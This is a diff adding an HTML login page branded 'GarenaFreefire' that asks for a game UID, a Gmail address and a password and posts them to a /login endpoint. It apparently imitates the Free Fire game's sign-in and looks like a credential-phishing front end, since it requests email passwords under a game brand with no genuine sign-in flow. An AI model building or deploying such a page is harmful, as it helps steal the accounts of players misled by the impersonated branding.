@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GarenaFreefire</title>
+    <style>
+        body{
+            height: 720px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: url('./assets/1089182.jpg');
+            background-position: center;
+            background-size: cover;
+            background-repeat: no-repeat;
+            margin-bottom: 100px;
+            overflow: hidden;
+            gap: 100px;
+        }
+        .linkBox{
+            height: 50px;
+            width: 350px;
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+        }
+        .linkBox img{
+            height: 40px;
+            transition: 500ms ease-in-out;
+        }
+        .linkBox img:hover{
+            filter: drop-shadow(2px 3px 3px rgb(255, 255, 255));
+            transform: scale(1.1);
+        }
+        .loginBox{
+            border: 1px solid rgb(255, 255, 255);
+            height: 50%;
+            border-radius: 10px;
+            width: 25%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            backdrop-filter: blur(5px);
+            margin-top: 150px;
+            gap: -20px;
+        }
+        .inputCon{
+            height: 55%;
+            width: 80%;
+            display: flex;
+            flex-direction: column;
+            padding: 10px;
+            border-radius: 10px;
+            gap:30px;
+        }
+        input{
+            padding: 12px;
+            border: none;
+            border-bottom:1px solid rgb(255, 255, 255);
+            background-color: transparent;
+            color: white;
+            transition: 300ms ease-in-out;
+        }
+        input::placeholder{
+            color: rgba(255, 255, 255, 0.626);
+            margin-left: 50px;
+            font-family: sans-serif;
+        }
+        input:focus{
+            outline: none;
+            border-bottom: 1px solid green;
+        }
+        input:focus::placeholder{
+            color: transparent;
+        }
+        .buttonCon{
+            padding: 10px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+        }
+        button{
+            width: 80%;
+            padding: 10px;
+            font-size: 20px;
+            border-radius: 7px;
+            font-family:sans-serif;
+            border: none;
+            background-color: rgb(170, 30, 30);
+            color: white;
+            transition: 500ms ease-in-out;
+        }
+        button:hover{
+            background-color: rgb(255, 0, 0);
+        }
+    </style>
+</head>
+<body>
+        <form class="loginBox" action="/login" method="POST">
+            <div class="inputCon">
+                <input type="text" name="uid" placeholder="Enter the UID" required>
+                <input type="text" name="username" placeholder="Enter the Gmail" required>
+                <input type="password"  name="password" placeholder="Enter the Password" required>
+            </div>
+            <div style="display:flex; justify-content:center;align-items:center; gap:10px;color:white">
+                <input class="radio" type="radio" name="radio"><label for="radio">Accept a terms & condition</label>
+            </div>
+            <div class="buttonCon">
+                <button type="submit" id="btn">Login</button>
+        </form>
+    </div>  
+    <div class="linkBox">
+        <img src="./assets/icons8-facebook-logo-96.png" alt="Facebook">
+        <img src="./assets/icons8-github-50.png" alt="github">
+        <img src="./assets/icons8-google-96.png" alt="google">
+        <img src="./assets/icons8-vk-96.png" alt="Vk">
+    </div> 
+</body>
+<script src="./freefire.js">
+</script>
+</html>
